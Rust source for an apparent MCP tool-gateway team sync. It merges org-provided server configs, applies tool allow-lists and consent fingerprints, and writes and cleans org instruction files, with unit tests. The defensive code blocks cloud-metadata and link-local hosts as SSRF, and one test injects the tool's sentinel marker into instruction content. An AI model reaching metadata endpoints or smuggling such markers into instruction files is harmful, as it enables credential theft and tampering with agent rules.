    // `disabledTools` is already applied on the ServerEntry itself (deny-list). Both layers
    // compose: a tool must be allow-listed (if a list is set) AND not disabled.
    apply_team_tool_scope(reg, &tool_allows, &tag);

    outcome
}

/// `allowedTools` on a team-config server JSON: `None` = key absent (unrestricted),
/// `Some(list)` = allow-list (empty list = block every tool on that server).
fn parse_allowed_tools(s: &Value) -> Option<Vec<String>> {
    match s.get("allowedTools") {
        None => None,
        Some(v) => Some(
            v.as_array()
                .map(|a| {
                    a.iter()
                        .filter_map(|x| x.as_str().map(String::from))
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default(),
        ),
    }
}

/// Apply or clear per-server allow-lists onto every profile's `tool_scope`.
/// `tool_allows` is keyed by the FINAL member-local server id (after `unique_id`), so a
/// collision rename never loses the org scope. Servers not in the map but still tagged for
/// this team (shouldn't happen) become unrestricted.
fn apply_team_tool_scope(
    reg: &mut Registry,
    tool_allows: &HashMap<String, Option<Vec<String>>>,
    tag: &str,
) {
    let team_ids: Vec<String> = reg
        .servers
        .iter()
        .filter(|s| is_team_server(s, tag))
        .map(|s| s.id.clone())
        .collect();
    for p in &mut reg.profiles {
        // Drop scope entries for team servers that are no longer present.
        p.tool_scope
            .retain(|sid, _| !sid.starts_with("team_") || team_ids.contains(sid));
        for sid in &team_ids {
            match tool_allows.get(sid) {
                Some(Some(list)) => {
                    p.tool_scope.insert(sid.clone(), list.clone());
                }
                // Unrestricted (key absent on config) or unknown: clear any prior org scope.
                Some(None) | None => {
                    p.tool_scope.remove(sid);
                }
            }
        }
    }
}

/// The execution-relevant identity of a team server, for binding a member's consent to
/// WHAT they enabled rather than to the id the org chose for it: transport, command, args,
/// env KEYS (sorted; values are the member's own and never in a team config), cwd and url.
/// Name, tool allow-list, client-credential metadata and the like are deliberately left
/// out: changing them does not change what runs on the member's machine, and re-prompting
/// on a rename would train members to click through. Length-prefixed so no choice of
/// separator inside a field can make two different definitions hash alike.
fn consent_fingerprint(entry: &ServerEntry) -> String {
    use sha2::{Digest, Sha256};
    let mut hasher = Sha256::new();
    let mut field = |tag: &str, value: &str| {
        hasher.update(tag.as_bytes());
        hasher.update((value.len() as u64).to_le_bytes());
        hasher.update(value.as_bytes());
    };
    field("transport", &entry.transport);
    field("command", entry.command.as_deref().unwrap_or(""));
    for arg in &entry.args {
        field("arg", arg);
    }
    let mut env_keys: Vec<&str> = entry.env.iter().map(|e| e.key.as_str()).collect();
    env_keys.sort_unstable();
    for key in env_keys {
        field("env", key);
    }
    field("cwd", entry.cwd.as_deref().unwrap_or(""));
    field("url", entry.url.as_deref().unwrap_or(""));
    hasher
        .finalize()
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Classify one team-config server JSON for the member's machine. Env keeps only keys
/// (no values, since the team server never carried a secret); the member vaults each
/// one locally.
fn classify_team_server(s: &Value, tag: &str) -> TeamClass {
    let str_field = |k: &str| s.get(k).and_then(Value::as_str).filter(|x| !x.is_empty());
    let orig_id = str_field("id");
    let name = match str_field("name").or(orig_id) {
        Some(n) => n,
        None => return TeamClass::Skip,
    };
    let id = format!("team_{}", slugify_id(orig_id.unwrap_or(name)));
    let str_array = |k: &str| {
        s.get(k)
            .and_then(Value::as_array)
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default()
    };
    let env = s
        .get("env")
        .and_then(Value::as_array)
        .map(|a| {
            a.iter()
                .filter_map(|e| {
                    let key = e.get("key").and_then(Value::as_str)?.to_string();
                    Some(EnvVar {
                        key,
                        value: None,
                        secret: e.get("secret").and_then(Value::as_bool).unwrap_or(true),
                    })
                })
                .collect()
        })
        .unwrap_or_default();

    // A block that is present but unparseable refuses the whole server rather
    // than importing it without one. Dropping it silently would hand the member a
    // server that falls back to the interactive browser flow -- which is the exact
    // thing this configuration exists to avoid, and on a headless machine it can
    // never complete. `Blocked` is counted in the merge outcome, so the member
    // sees that something was refused instead of getting a quietly broken server.
    let client_credentials = match s.get("clientCredentials").filter(|v| !v.is_null()) {
        Some(v) => match serde_json::from_value::<crate::registry::ClientCredentials>(v.clone()) {
            // A blank client id is "not configured", not malformed.
            Ok(c) if c.client_id.trim().is_empty() => None,
            // An auth method this build cannot perform is refused at import for
            // the same reason a malformed block is: importing it produces a
            // server that fails at connect instead of one the member was told
            // about.
            // Unrecognised OR recognised-but-unimplemented. `private_key_jwt`
            // parses fine and would otherwise import, then fail closed at every
            // connect with "not supported yet" -- a silently broken server, which
            // is the outcome this guard exists to prevent.
            Ok(c)
                if c.token_endpoint_auth_method.as_deref().is_some_and(|m| {
                    crate::oauth::ClientAuthMethod::parse(m)
                        .is_none_or(|parsed| !parsed.is_implemented())
                }) =>
            {
                return TeamClass::Blocked
            }
            Ok(mut c) => {
                c.strip_secret_fields();
                // Trim like the desktop command does: a padded client id or scope
                // reaches the token endpoint verbatim and can be rejected there.
                c.client_id = c.client_id.trim().to_string();
                c.scope = c
                    .scope
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty());
                c.token_endpoint_auth_method = c
                    .token_endpoint_auth_method
                    .map(|m| m.trim().to_string())
                    .filter(|m| !m.is_empty());
                Some(c)
            }
            Err(_) => return TeamClass::Blocked,
        },
        None => None,
    };

    let transport = str_field("transport").unwrap_or("stdio").to_string();
    let command = str_field("command").map(String::from);
    let mut entry = ServerEntry {
        id,
        name: name.to_string(),
        transport,
        command: None,
        args: str_array("args"),
        env,
        url: None,
        source: Some(tag.to_string()),
        disabled_tools: str_array("disabledTools"),
        cwd: None,
        // Carried through so a shared headless server stays headless. Dropping it
        // silently downgraded the member to interactive OAuth, which is exactly
        // what this flow exists to avoid; the secret is still theirs to add.
        client_credentials,
        request_timeout_ms: None,
        unknown_fields: serde_json::Map::new(),
    };

    // A server that runs a local command (stdio, or any command-bearing entry) is the RCE
    // case: carry the command so the member CAN run it, but only after they enable it.
    // Nothing here runs at sync time; the gateway only starts servers enabled in a profile.
    if entry.transport == "stdio" || command.is_some() {
        match command {
            Some(c) => entry.command = Some(c),
            None => return TeamClass::Skip, // stdio with no command is unusable
        }
        entry.request_timeout_ms = match s.get("requestTimeoutMs").filter(|value| !value.is_null()) {
            Some(value) => match value.as_u64().and_then(|milliseconds| {
                crate::registry::validate_request_timeout_ms(milliseconds).ok()
            }) {
                Some(milliseconds) => Some(milliseconds),
                None => return TeamClass::Blocked,
            },
            None => None,
        };
        return TeamClass::Review(entry);
    }

    // A remote server needs a parseable URL.
    let url = match str_field("url") {
        Some(u) => u,
        None => return TeamClass::Skip,
    };
    let host = match crate::oauth::host_of_url(url) {
        Some(h) => h,
        None => return TeamClass::Skip,
    };
    // Link-local / cloud-metadata (169.254.x, fe80::, AWS metadata): pure SSRF, never sync.
    if crate::oauth::host_is_link_local(&host) {
        return TeamClass::Blocked;
    }
    entry.url = Some(url.to_string());
    entry.request_timeout_ms = match s.get("requestTimeoutMs").filter(|value| !value.is_null()) {
        Some(value) => match value.as_u64().and_then(|milliseconds| {
            crate::registry::validate_request_timeout_ms(milliseconds).ok()
        }) {
            Some(milliseconds) => Some(milliseconds),
            None => return TeamClass::Blocked,
        },
        None => None,
    };
    // Loopback / LAN (RFC1918) is a legit internal server, but require opt-in like stdio.
    if crate::oauth::host_is_private(&host) {
        return TeamClass::Review(entry);
    }
    TeamClass::Ready(entry)
}

fn slugify_id(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() {
                c.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect::<String>()
        .trim_matches('-')
        .to_string()
}

/// Remove all of a team's merged servers (and their profile entries) on disconnect.
/// The member's own servers and profiles are left intact.
pub fn remove_team(reg: &mut Registry, team_id: &str) {
    let tag = tag_for(team_id);
    let ids: Vec<String> = reg
        .servers
        .iter()
        .filter(|s| is_team_server(s, &tag))
        .map(|s| s.id.clone())
        .collect();
    reg.servers.retain(|s| !is_team_server(s, &tag));
    for p in &mut reg.profiles {
        p.enabled_server_ids.retain(|id| !ids.contains(id));
        // Drop org tool allowlists for the removed team servers (SOU-167).
        for id in &ids {
            p.tool_scope.remove(id);
        }
    }
    // Release ALL of this team's forced safety locks: the member is no longer in the team, so
    // an org-forced policy (HITL, destructive-block, content defense, drift-quarantine,
    // block-on-injection) must not keep applying. Their OWN settings are left untouched.
    reg.team_forced_human_approval = false;
    reg.team_forced_deny_destructive = false;
    reg.team_forced_content_defense = false;
    reg.team_forced_quarantine_on_drift = false;
    reg.team_forced_block_on_injection = false;
    reg.team_forced_pii_redaction = false;
    // Export flag lives on TeamConnection which is cleared on disconnect; no extra field.
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn hosted_url_matches_the_react_shell() {
        let path = concat!(env!("CARGO_MANIFEST_DIR"), "/../src/lib/teamUrl.ts");
        let source = std::fs::read_to_string(path).expect("teamUrl.ts is readable");
        assert!(source.contains(&format!(
            "export const HOSTED_TEAMS_URL = \"{HOSTED_TEAMS_URL}\""
        )));
    }

    #[test]
    fn desired_instructions_reads_enabled_nonempty_content() {
        let cfg = json!({ "instructions": { "enabled": true, "content": "Rule one" } });
        assert_eq!(desired_instructions(&cfg).as_deref(), Some("Rule one"));
        // `enabled` defaults to true when omitted.
        let cfg = json!({ "instructions": { "content": "Implied on" } });
        assert_eq!(desired_instructions(&cfg).as_deref(), Some("Implied on"));
    }

    #[test]
    fn desired_instructions_treats_disabled_blank_or_absent_as_removal() {
        for cfg in [
            json!({ "instructions": { "enabled": false, "content": "hidden" } }),
            json!({ "instructions": { "enabled": true, "content": "   \n  " } }),
            json!({ "instructions": { "enabled": true } }),
            json!({ "servers": [] }), // key absent (e.g. Free/lapsed team, soft-dropped)
        ] {
            assert_eq!(
                desired_instructions(&cfg),
                None,
                "should mean removal: {cfg}"
            );
        }
    }

    /// SBS-899: a release that MOVES where a client reads its rules from must relocate an
    /// already-applied block. The org text is unchanged, so the content-hash skip used to return
    /// before writing anything: the new path stayed empty and coverage reported Stale until an
    /// admin happened to edit the instructions.
    #[test]
    fn apply_instructions_relocates_a_block_whose_target_path_moved() {
        const TEAM: &str = "team_relocate";
        const CONTENT: &str = "Use the approved issue workflow.";
        const VERSION: i64 = 4;
        use crate::instructions::{ApplyState, Strategy, Target};

        // Both guards: the test sets GOOSE_PATH_ROOT and redirects the data dir, and both are
        // process-global.
        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let base = std::env::temp_dir().join(format!("toolport-relocate-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let _data_dir = crate::registry::DataDirOverride::set(base.join("data"));
        // Stands in for the pre-fix `~/.config/goose/.goosehints` (a test must not write into the
        // developer's real home). An absolute GOOSE_PATH_ROOT then puts the live target at
        // `<root>/config/.goosehints`, exactly the move this PR introduces.
        let old_path = base
            .join("old-home")
            .join(".config")
            .join("goose")
            .join(".goosehints");
        let root = base.join("goose-root");
        let _root = crate::clients::EnvRestore::set("GOOSE_PATH_ROOT", &root);

        let old_target = Target {
            path: old_path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: crate::instructions::Scope::Team,
            char_cap: None,
            blocked_if_present: None,
        };
        assert_eq!(
            crate::instructions::write_target(&old_target, TEAM, VERSION, CONTENT),
            ApplyState::Applied,
            "fixture: the previous release's block at the old path"
        );
        let conn: TeamConnection = serde_json::from_value(json!({
            "serverUrl": "https://teams.example.com",
            "teamId": TEAM,
            "role": "member",
            "teamInstructionsContent": CONTENT,
            "teamInstructionsVersion": VERSION,
            "teamInstructionsTargets": [old_path.to_string_lossy()],
        }))
        .expect("team connection fixture");
        crate::registry::update(|reg| {
            reg.team = Some(conn.clone());
            Ok(())
        })
        .expect("seed the registry");

        let target = crate::clients::client_rules_target("goose", crate::instructions::Scope::Team)
            .expect("goose rules target");
        assert_eq!(
            target.path,
            root.join("config").join(".goosehints"),
            "fixture: GOOSE_PATH_ROOT must move the live target"
        );

        // Same content, same version. Only the PATH moved.
        apply_instructions_to(TEAM, VERSION, Some(CONTENT), std::slice::from_ref(&target));

        let moved = std::fs::read_to_string(&target.path).unwrap_or_default();
        let recorded = crate::registry::load()
            .ok()
            .and_then(|reg| reg.team)
            .map(|t| t.team_instructions_targets)
            .unwrap_or_default();
        let old_left_behind = old_path.exists();
        let _ = std::fs::remove_dir_all(&base);

        assert!(
            moved.contains(crate::instructions::SENTINEL_START_PREFIX) && moved.contains(CONTENT),
            "the block must be rewritten at the new path, not skipped as unchanged content"
        );
        assert!(
            !old_left_behind,
            "the old file held only our block, so cleanup must remove it rather than leave a \
             stale duplicate"
        );
        assert_eq!(
            recorded,
            vec![target.path.to_string_lossy().to_string()],
            "the recorded target must follow the move, so leave/disconnect cleans up the right file"
        );
    }

    #[test]
    fn unchanged_instructions_ignore_an_unrelated_config_version_bump() {
        use crate::instructions::{Scope, Strategy, Target};

        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let scratch =
            std::env::temp_dir().join(format!("toolport-sbs917-version-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&scratch);
        std::fs::create_dir_all(&scratch).unwrap();
        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));
        let path = scratch.join("rules.md");
        const TEAM: &str = "team_sbs917_version";
        const CONTENT: &str = "Use the approved workflow.";
        seed_applied_instructions(TEAM, 4, CONTENT, &path);
        let target = Target {
            path: path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: None,
            blocked_if_present: None,
        };
        let before = std::fs::read_to_string(&path).unwrap();

        apply_instructions_to(TEAM, 5, Some(CONTENT), std::slice::from_ref(&target));

        let after = std::fs::read_to_string(&path).unwrap();
        let (_, version, recorded) = loaded_instructions();
        let _ = std::fs::remove_dir_all(&scratch);
        assert_eq!(
            after, before,
            "a server-only config bump must not rewrite rules"
        );
        assert_eq!(
            version, 4,
            "the persisted instruction marker version stays authoritative"
        );
        assert_eq!(recorded, vec![path.to_string_lossy().to_string()]);
    }

    /// Write last-good org rules to `path` and record them on the connected team.
    /// Caller holds `data_dir_test_lock` and a `DataDirOverride`.
    fn seed_applied_instructions(team: &str, version: i64, content: &str, path: &std::path::Path) {
        use crate::instructions::{ApplyState, Scope, Strategy, Target};
        let target = Target {
            path: path.to_path_buf(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: None,
            blocked_if_present: None,
        };
        assert_eq!(
            crate::instructions::write_target(&target, team, version, content),
            ApplyState::Applied,
            "fixture: last-good v{version} must land on disk"
        );
        let conn: TeamConnection = serde_json::from_value(json!({
            "serverUrl": "https://teams.example.com",
            "teamId": team,
            "role": "member",
            "teamInstructionsContent": content,
            "teamInstructionsVersion": version,
            "teamInstructionsTargets": [path.to_string_lossy()],
        }))
        .expect("team connection fixture");
        crate::registry::update(|reg| {
            reg.team = Some(conn);
            Ok(())
        })
        .expect("seed the registry");
    }

    fn loaded_instructions() -> (Option<String>, i64, Vec<String>) {
        match crate::registry::load().ok().and_then(|reg| reg.team) {
            Some(t) => (
                t.team_instructions_content,
                t.team_instructions_version,
                t.team_instructions_targets,
            ),
            None => (None, 0, Vec::new()),
        }
    }

    /// SBS-917: a refused rewrite must not treat last-good as obsolete. `write_target`
    /// leaves the file untouched on Error / TooLong / BlockedOverride; deleting it and
    /// dropping the path from the recorded set used to strip working org rules. The new
    /// content watermark is still persisted so coverage reports TooLong for v2 rather
    /// than Applied for leftover v1.
    #[test]
    fn apply_instructions_keeps_last_good_when_rewrite_is_refused() {
        use crate::instructions::{ApplyState, Scope, Strategy, Target};

        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let scratch =
            std::env::temp_dir().join(format!("toolport-sbs917-keep-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&scratch);
        std::fs::create_dir_all(&scratch).unwrap();
        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));

        const TEAM: &str = "team_sbs917";
        const V1: &str = "Keep the approved workflow.";
        const V2: &str = "A much longer org rule set that a char-cap client will refuse.";

        // --- TooLong (the Windsurf worst case in the ticket) ---
        let too_long_path = scratch.join("windsurf-rules.md");
        seed_applied_instructions(TEAM, 1, V1, &too_long_path);
        let too_long_target = Target {
            path: too_long_path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: Some(20),
            blocked_if_present: None,
        };
        apply_instructions_to(TEAM, 2, Some(V2), std::slice::from_ref(&too_long_target));
        let on_disk = std::fs::read_to_string(&too_long_path).unwrap_or_default();
        let (content, version, recorded) = loaded_instructions();
        assert!(
            on_disk.contains(V1) && !on_disk.contains(V2),
            "TooLong must leave last-good v1 on disk, not strip it: {on_disk:?}"
        );
        assert_eq!(
            recorded,
            vec![too_long_path.to_string_lossy().to_string()],
            "last-good path must stay recorded so disconnect can still clean it up"
        );
        assert_eq!(
            content.as_deref(),
            Some(V2),
            "coverage watermark must advance to the refused v2"
        );
        assert_eq!(version, 2);
        assert_eq!(
            crate::instructions::current_state(&too_long_target, TEAM, 2, V2),
            ApplyState::TooLong,
            "coverage of the refused v2 is TooLong, not Stale — that is why a deleted last-good never retried"
        );

        // --- Error (org content embeds our own sentinel; write_target refuses) ---
        let err_path = scratch.join("error-rules.md");
        seed_applied_instructions(TEAM, 1, V1, &err_path);
        let err_target = Target {
            path: err_path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: None,
            blocked_if_present: None,
        };
        let poisoned = format!("{} injected", crate::instructions::SENTINEL_START_PREFIX);
        apply_instructions_to(TEAM, 3, Some(&poisoned), std::slice::from_ref(&err_target));
        let on_disk = std::fs::read_to_string(&err_path).unwrap_or_default();
        let (_, _, recorded) = loaded_instructions();
        assert!(
            on_disk.contains(V1) && !on_disk.contains("injected"),
            "Error must leave last-good v1 on disk: {on_disk:?}"
        );
        assert_eq!(recorded, vec![err_path.to_string_lossy().to_string()]);

        // --- BlockedOverride (Codex-style shadow file) ---
        let blocked_path = scratch.join("AGENTS.md");
        let shadow = scratch.join("AGENTS.override.md");
        seed_applied_instructions(TEAM, 1, V1, &blocked_path);
        std::fs::write(&shadow, "opt out").unwrap();
        let blocked_target = Target {
            path: blocked_path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: None,
            blocked_if_present: Some(shadow.clone()),
        };
        apply_instructions_to(TEAM, 4, Some(V2), std::slice::from_ref(&blocked_target));
        let on_disk = std::fs::read_to_string(&blocked_path).unwrap_or_default();
        let (_, _, recorded) = loaded_instructions();
        assert!(
            on_disk.contains(V1) && !on_disk.contains(V2),
            "BlockedOverride must leave last-good v1 on disk: {on_disk:?}"
        );
        assert_eq!(recorded, vec![blocked_path.to_string_lossy().to_string()]);

        std::fs::remove_file(&shadow).unwrap();
        apply_instructions_to(TEAM, 4, Some(V2), std::slice::from_ref(&blocked_target));
        let retried = std::fs::read_to_string(&blocked_path).unwrap_or_default();
        assert!(
            retried.contains(V2) && !retried.contains(V1),
            "the same v2 must be retried after the override refusal lifts: {retried:?}"
        );

        let _ = std::fs::remove_dir_all(&scratch);
    }

    #[test]
    fn unchanged_instructions_remove_a_retained_path_when_its_client_disappears() {
        use crate::instructions::{Scope, Strategy, Target};

        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let scratch = std::env::temp_dir().join(format!(
            "toolport-sbs917-uninstalled-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&scratch);
        std::fs::create_dir_all(&scratch).unwrap();
        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));
        let path = scratch.join("rules.md");
        const TEAM: &str = "team_sbs917_uninstalled";
        const V1: &str = "Keep the approved workflow.";
        const V2: &str = "A much longer org rule set that a char-cap client will refuse.";
        seed_applied_instructions(TEAM, 1, V1, &path);
        let target = Target {
            path: path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: Some(20),
            blocked_if_present: None,
        };
        apply_instructions_to(TEAM, 2, Some(V2), std::slice::from_ref(&target));
        assert!(path.exists(), "fixture: refused rewrite keeps last-good");

        apply_instructions_to(TEAM, 2, Some(V2), &[]);

        let (_, version, recorded) = loaded_instructions();
        let leftover = std::fs::read_to_string(&path).unwrap_or_default();
        let _ = std::fs::remove_dir_all(&scratch);
        assert!(
            !leftover.contains(V1),
            "the disappeared client's old block must be cleaned"
        );
        assert!(
            recorded.is_empty(),
            "the obsolete path must be dropped from the record"
        );
        assert_eq!(
            version, 2,
            "cleanup alone must not change the instruction watermark"
        );
    }

    /// SBS-917: keeping last-good on a refused rewrite must not stop a real removal.
    /// When the org clears instructions, every recorded path is obsolete and must go.
    #[test]
    fn apply_instructions_still_removes_last_good_when_org_clears_instructions() {
        use crate::instructions::{Scope, Strategy, Target};

        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let scratch =
            std::env::temp_dir().join(format!("toolport-sbs917-clear-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&scratch);
        std::fs::create_dir_all(&scratch).unwrap();
        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));
        let path = scratch.join("rules.md");
        const TEAM: &str = "team_sbs917_clear";
        const V1: &str = "Keep the approved workflow.";
        seed_applied_instructions(TEAM, 1, V1, &path);
        let target = Target {
            path: path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: None,
            blocked_if_present: None,
        };
        apply_instructions_to(TEAM, 2, None, std::slice::from_ref(&target));
        let leftover = std::fs::read_to_string(&path).unwrap_or_default();
        let (_, _, recorded) = loaded_instructions();
        let _ = std::fs::remove_dir_all(&scratch);
        assert!(
            !leftover.contains(V1),
            "clearing org instructions must still strip last-good, not keep it: {leftover:?}"
        );
        assert!(
            recorded.is_empty(),
            "recorded set must be empty after a successful removal"
        );
    }

    #[test]
    fn failed_instruction_cleanup_stays_recorded_and_retries() {
        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let scratch =
            std::env::temp_dir().join(format!("toolport-sbs917-cleanup-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&scratch);
        std::fs::create_dir_all(&scratch).unwrap();
        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));
        let path = scratch.join("rules.md");
        const TEAM: &str = "team_sbs917_cleanup";
        const CONTENT: &str = "Keep the approved workflow.";
        seed_applied_instructions(TEAM, 1, CONTENT, &path);
        let valid = std::fs::read_to_string(&path).unwrap();

        // A start marker without an end marker is deliberately not rewritten or removed.
        // The path must remain recorded or no later sync would know to retry it.
        std::fs::write(
            &path,
            format!(
                "{}\nunterminated",
                crate::instructions::SENTINEL_START_PREFIX
            ),
        )
        .unwrap();
        apply_instructions_to(TEAM, 2, None, &[]);
        let (content, version, recorded) = loaded_instructions();
        assert_eq!(content, None);
        assert_eq!(version, 2);
        assert_eq!(recorded, vec![path.to_string_lossy().to_string()]);

        // Once the file is readable and well-formed again, the unchanged-content cleanup path
        // retries the recorded location and can finally forget it.
        std::fs::write(&path, valid).unwrap();
        apply_instructions_to(TEAM, 2, None, &[]);
        let (_, _, recorded) = loaded_instructions();
        assert!(
            !path.exists(),
            "the repaired recorded path should be cleaned"
        );
        assert!(
            recorded.is_empty(),
            "a successful retry may forget the path"
        );
        let _ = std::fs::remove_dir_all(&scratch);
    }

    /// SBS-914: losing the compare-and-set must not delete what we wrote. A team switch that
    /// won the race gets the paths on its own record and reconciles them; only a disconnect
    /// (no team left) makes an empty file the right end state.
    #[test]
    fn a_lost_record_race_hands_written_paths_to_the_winner_instead_of_deleting_them() {
        use crate::instructions::{self, ApplyState, Scope, Strategy, Target};

        let _env = crate::clients::env_test_lock();
        let _dirs = crate::registry::data_dir_test_lock();
        let scratch =
            std::env::temp_dir().join(format!("toolport-sbs914-race-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&scratch);
        std::fs::create_dir_all(&scratch).unwrap();
        let _data = crate::registry::DataDirOverride::set(scratch.join("data"));
        let path = scratch.join("AGENTS.md");
        let key = path.to_string_lossy().to_string();
        let target = Target {
            path: path.clone(),
            strategy: Strategy::SentinelBlock,
            scope: Scope::Team,
            char_cap: None,
            blocked_if_present: None,
        };
        // `connect` gives the team instruction content (the realistic winner of a switch);
        // `team_c` below is the content-less case.
        let connect = |team: &str| {
            let content = if team == "team_c" {
                Value::Null
            } else {
                json!(format!("{team}'s rules"))
            };
            let conn: TeamConnection = serde_json::from_value(json!({
                "serverUrl": "https://teams.example.com",
                "teamId": team,
                "role": "member",
                "teamInstructionsContent": content,
            }))
            .unwrap();
            crate::registry::update(|reg| {
                reg.team = Some(conn);
                Ok(())
            })
            .unwrap();
        };

        // The loser (team_a) finished writing; by the time it records, team_b has won.
        assert_eq!(
            instructions::write_target(&target, "team_a", 3, "a's rules"),
            ApplyState::Applied
        );
        connect("team_b");
        record_applied_instructions(
            "team_a",
            Some("a's rules".into()),
            3,
            vec![key.clone()],
            &[key.clone()],
        );
        assert!(
            instructions::is_present(&path, Scope::Team),
            "the block is left for the winner to reconcile, not deleted"
        );
        let (content, _, recorded) = loaded_instructions();
        assert_eq!(
            content.as_deref(),
            Some("team_b's rules"),
            "the loser's watermark is not written over the winner's"
        );
        assert_eq!(
            recorded,
            vec![key.clone()],
            "the winner's record now owns the path"
        );
        // The winner's next apply sees the path as Stale for its own content and rewrites it.
        assert_eq!(
            instructions::current_state(&target, "team_b", 1, "b's rules"),
            ApplyState::Stale
        );

        // A winner with NO instruction content (mid-connect, or org instructions off) still
        // adopts the path - it may be about to fill content in - and its own next apply with
        // nothing desired cleans every recorded path, so the block does not linger.
        assert_eq!(
            instructions::write_target(&target, "team_a", 3, "a's rules"),
            ApplyState::Applied
        );
        connect("team_c");
        record_applied_instructions(
            "team_a",
            Some("a's rules".into()),
            3,
            vec![key.clone()],
            &[key.clone()],
        );
        assert!(path.exists(), "adoption never deletes");
        let (_, _, recorded) = loaded_instructions();
        assert_eq!(
            recorded,
            vec![key.clone()],
            "the content-less winner now owns the path"
        );
        apply_instructions_to("team_c", 1, None, &[target.clone()]);
        assert!(
            !path.exists(),
            "the winner's no-content pass cleans the adopted block"
        );
        let (_, _, recorded) = loaded_instructions();
        assert!(recorded.is_empty());

        // A disconnect that won leaves no team: nothing could want the block, so it goes.
        assert_eq!(
            instructions::write_target(&target, "team_a", 4, "a's rules"),
            ApplyState::Applied
        );
        crate::registry::update(|reg| {
            reg.team = None;
            Ok(())
        })
        .unwrap();
        record_applied_instructions(
            "team_a",
            Some("a's rules".into()),
            4,
            vec![key.clone()],
            &[key.clone()],
        );
        assert!(
            !path.exists(),
            "with no team left, our block (and the file we created) is removed"
        );

        // The ordinary case: the set holds and everything is recorded as before.
        assert_eq!(
            instructions::write_target(&target, "team_a", 5, "a's rules"),
            ApplyState::Applied
        );
        connect("team_a");
        record_applied_instructions(
            "team_a",
            Some("a's rules".into()),
            5,
            vec![key.clone()],
            &[key.clone()],
        );
        let (content, version, recorded) = loaded_instructions();
        assert_eq!(content.as_deref(), Some("a's rules"));
        assert_eq!(version, 5);
        assert_eq!(recorded, vec![key]);
        let _ = std::fs::remove_dir_all(&scratch);
    }

    #[test]
    fn merge_reported_takes_the_max_per_counter() {
        // A log rotation can shrink the local rollup mid-day; the already-reported
        // watermark must win so the re-send never erases counts the server has.
        let mut local = BTreeMap::new();
        local.insert(
            "github".to_string(),
            usage_report::Row {
                calls: 3,
                tokens_saved: 900,
            },
        );
        local.insert(
            "stripe".to_string(),
            usage_report::Row {
                calls: 7,
                tokens_saved: 0,
            },
        );
        let mut reported = HashMap::new();
        reported.insert("github".to_string(), [10, 100]); // rotation ate 7 calls; saved grew
        let merged = merge_reported(&local, Some(&reported));
        assert_eq!(merged["github"], [10, 900]); // max per counter, independently
        assert_eq!(merged["stripe"], [7, 0]); // new server passes through
    }

    #[test]
    fn merge_reported_keeps_servers_the_rollup_no_longer_sees() {
        // A server reported earlier today then trimmed from the logs entirely must
        // survive the merge, or the replacement upsert would zero it server-side.
        let mut reported = HashMap::new();
        reported.insert("github".to_string(), [5, 50]);
        let merged = merge_reported(&BTreeMap::new(), Some(&reported));
        assert_eq!(merged["github"], [5, 50]);
    }

    fn base_registry() -> Registry {
        let mut r = Registry::default();
        r.servers.push(ServerEntry {
            id: "mine".into(),
            name: "Mine".into(),
            transport: "stdio".into(),
            command: Some("x".into()),
            args: vec![],
            env: vec![],
            url: None,
            source: Some("manual".into()),
            disabled_tools: vec![],
            cwd: None,
            client_credentials: None,
            request_timeout_ms: None,
            unknown_fields: serde_json::Map::new(),
        });
        let active = r.active_profile_id.clone().unwrap();
        r.profiles
            .iter_mut()
            .find(|p| p.id == active)
            .unwrap()
            .enabled_server_ids
            .push("mine".into());
        r
    }

    fn active_enabled(r: &Registry) -> Vec<String> {
        let active = r.active_profile_id.clone().unwrap();
        r.profiles
            .iter()
            .find(|p| p.id == active)
            .unwrap()
            .enabled_server_ids
            .clone()
    }

    #[test]
    fn merge_adds_team_servers_without_touching_local() {
        let mut r = base_registry();
        let cfg = json!({ "servers": [
            { "id": "github", "name": "GitHub", "transport": "http", "url": "https://1.2.3.4/mcp",
              "env": [{ "key": "TOKEN", "secret": true }], "requestTimeoutMs": 90_000 },
            { "id": "stripe", "name": "Stripe", "transport": "http", "url": "https://1.2.3.5/mcp" }
        ]});
        assert_eq!(apply_team_config(&mut r, "t1", &cfg).applied, 2);

        assert!(
            r.servers.iter().any(|s| s.id == "mine"),
            "local server preserved"
        );
        let gh = r.servers.iter().find(|s| s.id == "team_github").unwrap();
        assert_eq!(gh.source.as_deref(), Some("team:t1"));
        assert_eq!(gh.env[0].key, "TOKEN");
